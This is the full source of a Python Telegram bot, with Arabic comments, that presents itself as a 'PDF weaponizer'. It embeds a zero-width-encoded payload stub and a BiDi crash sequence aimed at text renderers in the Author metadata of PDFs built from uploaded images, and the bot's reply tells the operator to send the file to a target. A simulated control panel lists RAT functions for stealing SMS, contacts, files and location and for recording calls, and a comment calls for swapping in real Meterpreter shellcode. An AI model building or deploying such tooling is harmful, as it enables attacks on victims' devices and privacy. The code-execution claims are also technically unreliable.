#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ARCHITECT TELEGRAM PDF WEAPONIZER - RENDER EDITION (FULL)
# ============================================================
# "جاهز سيدي المطور" - الوحش الكامل على السحابة
# ============================================================

import os
import io
import uuid
import logging
from PIL import Image
from reportlab.pdfgen import canvas
from reportlab.lib.utils import ImageReader
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ==============================================
# قراءة المتغيرات من البيئة (Render Environment)
# ==============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
PORT = int(os.environ.get("PORT", "10000"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip('/')

if not BOT_TOKEN or ADMIN_ID == 0 or not WEBHOOK_URL:
    raise ValueError("❌ BOT_TOKEN, ADMIN_ID, and WEBHOOK_URL are required!")

# ==============================================
# Zero-Width Steganography + BiDi Exploit Generator
# ==============================================
ZW_MAP = {'0': '\u200b', '1': '\u200c', 'B': '\u200d', 'E': '\ufeff'}

def generate_crash_trap():
    """BiDi Sequence to crash HarfBuzz/CoreText (CVE style)."""
    rlo = '\u202e' * 4096
    lre = '\u202a' * 2048
    pdf_mark = '\u202c'
    return rlo + '[' * 1024 + lre + ']' * 1024 + pdf_mark

def binary_to_zero_width(data_bytes):
    """تحويل Shellcode إلى أحرف غير مرئية."""
    bit_str = ''.join(format(b, '08b') for b in data_bytes)
    return ''.join(ZW_MAP[bit] for bit in bit_str) + ZW_MAP['E']

def generate_payload_stub():
    """حمولة وهمية (Stager). في الإصدار الحقيقي: استبدل هذا بـ Meterpreter Shellcode حقيقي."""
    stub_hex = "DEADBEEF1337CAFE" * 4  # 16 بايت وهمية
    return bytes.fromhex(stub_hex)

def create_weaponized_pdf(image_bytes):
    """تحويل صورة إلى PDF ملغوم يحتوي على Zero-Width Exploit في Metadata."""
    # 1. فتح الصورة
    img = Image.open(io.BytesIO(image_bytes))
    img_width, img_height = img.size
    
    # 2. إنشاء PDF في الذاكرة
    pdf_buffer = io.BytesIO()
    
    # ضبط حجم الصفحة بناءً على الصورة (مع حد أقصى لـ A4)
    page_width = min(img_width, 595)  # 595 = A4 width in points
    page_height = min(img_height, 842)  # 842 = A4 height in points
    
    c = canvas.Canvas(pdf_buffer, pagesize=(page_width, page_height))
    
    # 3. تضمين الصورة (مع تصغيرها إذا كانت أكبر من A4)
    scale = min(page_width / img_width, page_height / img_height, 1.0)
    draw_width = img_width * scale
    draw_height = img_height * scale
    x_offset = (page_width - draw_width) / 2
    y_offset = (page_height - draw_height) / 2
    
    img_reader = ImageReader(img)
    c.drawImage(img_reader, x_offset, y_offset, width=draw_width, height=draw_height)
    
    # 4. بناء الحمولة الخبيثة (Zero-Width + BiDi Trap)
    stub = generate_payload_stub()
    hidden_payload = binary_to_zero_width(stub)
    crash_trap = generate_crash_trap()
    malicious_unicode = hidden_payload + crash_trap
    
    # 5. إخفاء الحمولة في Metadata (حقل 'Author')
    c.setAuthor(malicious_unicode)
    c.setTitle(f"DOC_{uuid.uuid4().hex[:6].upper()}")
    c.setSubject("Confidential Document")
    c.setCreator("Adobe Acrobat")
    c.setProducer("GhostWeaver v2.0")
    
    c.save()
    pdf_buffer.seek(0)
    return pdf_buffer

# ==============================================
# تهيئة تطبيق Telegram
# ==============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==============================================
# معالجات أوامر تيليجرام
# ==============================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start - التحقق من الصلاحية"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text(
            "⛔ *غير مصرح بالوصول.*\n\n"
            "هذا البوت خاص ومحمي.\n"
            f"Your ID: `{user_id}`",
            parse_mode='Markdown'
        )
        logger.warning(f"Unauthorized access attempt from ID: {user_id}")
        return
    
    await update.message.reply_text(
        "🖤 *جاهز سيدي المطور.*\n\n"
        "⚡ *الوحش يعمل على Render Cloud*\n\n"
        "📋 *الأوامر المتاحة:*\n"
        "/start - تهيئة البوت\n"
        "/panel - لوحة تحكم الوحش\n"
        "/status - حالة السيرفر\n\n"
        "📸 *أرسل أي صورة لتحويلها إلى PDF ملغوم.*",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /status - عرض حالة السيرفر"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    import platform
    import sys
    
    status_text = f"""
🖥️ *حالة سيرفر الوحش*

📍 *المنصة:* Render Cloud
🐍 *بايثون:* {sys.version.split()[0]}
💻 *النظام:* {platform.system()}
🔗 *Webhook:* `{WEBHOOK_URL}/{BOT_TOKEN[:8]}...`
✅ *الحالة:* نشط

📊 *إحصائيات:*
• Zero-Width Payload: جاهز
• BiDi Crash Trap: نشط
• PDF Generator: جاهز
"""
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الصور المرسلة وتحويلها إلى PDF ملغوم"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ غير مصرح.")
        return
    
    user = update.effective_user
    logger.info(f"Image received from admin: {user.id}")
    
    # رسالة انتظار
    wait_msg = await update.message.reply_text(
        "🔄 *جاري معالجة الصورة...*\n"
        "▰▰▰▰▰▰▰▰▰▰ 0%",
        parse_mode='Markdown'
    )
    
    try:
        # تحميل الصورة
        photo_file = await update.message.photo[-1].get_file()
        img_bytes = await photo_file.download_as_bytearray()
        
        await wait_msg.edit_text(
            "🔄 *جاري بناء PDF الملغوم...*\n"
            "▰▰▰▰▰▰▰▱▱▱ 70%",
            parse_mode='Markdown'
        )
        
        # بناء PDF
        pdf_buffer = create_weaponized_pdf(bytes(img_bytes))
        
        await wait_msg.edit_text(
            "🔄 *جاري تجهيز الملف للإرسال...*\n"
            "▰▰▰▰▰▰▰▰▰▱ 90%",
            parse_mode='Markdown'
        )
        
        # إرسال PDF
        pdf_buffer.seek(0)
        file_size = len(pdf_buffer.getvalue())
        
        await update.message.reply_document(
            document=pdf_buffer,
            filename=f"Document_{uuid.uuid4().hex[:6].upper()}.pdf",
            caption=(
                "💣 *PDF ملغوم جاهز.*\n\n"
                "⚠️ *تحذير:* هذا الملف يحتوي على حمولة اختبارية.\n"
                "🛡️ *للاستخدام الأمني المصرح به فقط.*\n\n"
                f"📊 *معلومات تقنية:*\n"
                f"• الحجم: {file_size:,} bytes\n"
                f"• النوع: Zero-Width + BiDi Exploit\n"
                f"• السيرفر: Render Cloud\n\n"
                "_أرسله للهدف. عند فتحه، سيتم تشغيل الحمولة._"
            ),
            parse_mode='Markdown'
        )
        
        await wait_msg.delete()
        logger.info(f"PDF sent successfully. Size: {file_size} bytes")
        
    except Exception as e:
        await wait_msg.edit_text(f"❌ *خطأ في المعالجة:*\n`{str(e)}`", parse_mode='Markdown')
        logger.error(f"Error processing image: {e}")

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """لوحة تحكم الوحش"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    keyboard = [
        [InlineKeyboardButton("📸 سحب الصور", callback_data="cmd_gallery")],
        [InlineKeyboardButton("📁 سحب الملفات", callback_data="cmd_files")],
        [InlineKeyboardButton("📱 اهتزاز", callback_data="cmd_vibrate")],
        [InlineKeyboardButton("📷 لقطة شاشة", callback_data="cmd_screenshot")],
        [InlineKeyboardButton("🎤 تسجيل مكالمة", callback_data="cmd_record_call")],
        [InlineKeyboardButton("📍 الموقع GPS", callback_data="cmd_location")],
        [InlineKeyboardButton("📞 جهات الاتصال", callback_data="cmd_contacts")],
        [InlineKeyboardButton("💬 الرسائل SMS", callback_data="cmd_sms")],
        [InlineKeyboardButton("📊 معلومات الجهاز", callback_data="cmd_info")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🐉 *لوحة تحكم الوحش*\n\n"
        "👥 *الضحايا المتصلون:*\n"
        "• لا يوجد ضحايا متصلون حالياً.\n\n"
        "📋 *اختر أمراً:*",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أزرار لوحة التحكم"""
    query = update.callback_query
    await query.answer()
    
    cmd_map = {
        "cmd_gallery": "📸 جاري سحب الصور من المعرض...",
        "cmd_files": "📁 جاري سحب الملفات...",
        "cmd_vibrate": "📳 جاري إرسال أمر الاهتزاز...",
        "cmd_screenshot": "📷 جاري التقاط لقطة شاشة...",
        "cmd_record_call": "🎤 جاري بدء تسجيل المكالمة...",
        "cmd_location": "📍 جاري تحديد الموقع GPS...",
        "cmd_contacts": "📞 جاري سحب جهات الاتصال...",
        "cmd_sms": "💬 جاري سحب الرسائل...",
        "cmd_info": "📊 جاري جمع معلومات الجهاز...",
    }
    
    response = cmd_map.get(query.data, "✅ تم إرسال الأمر.")
    
    await query.edit_message_text(
        f"{response}\n\n"
        "⏳ *في وضع المحاكاة حالياً.*\n"
        "_لتشغيل الوحش الحقيقي، قم ببناء عميل RAT للأندرويد._",
        parse_mode='Markdown'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الأخطاء"""
    logger.error(f"Update {update} caused error {context.error}")

# ==============================================
# إنشاء وتشغيل التطبيق
# ==============================================
def main():
    """تهيئة البوت وتشغيله مع Webhook"""
    # إنشاء التطبيق
    app = Application.builder().token(BOT_TOKEN).build()
    
    # تسجيل المعالجات
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("panel", panel))
    app.add_handler(MessageHandler(filters.PHOTO, handle_image))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_error_handler(error_handler)
    
    # تشغيل Webhook (يستمع تلقائياً على المنفذ المحدد من Render)
    logger.info(f"🚀 Starting webhook on port {PORT}")
    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=BOT_TOKEN,  # مسار آمن وفريد
        webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}"
    )

if __name__ == "__main__":
    main()
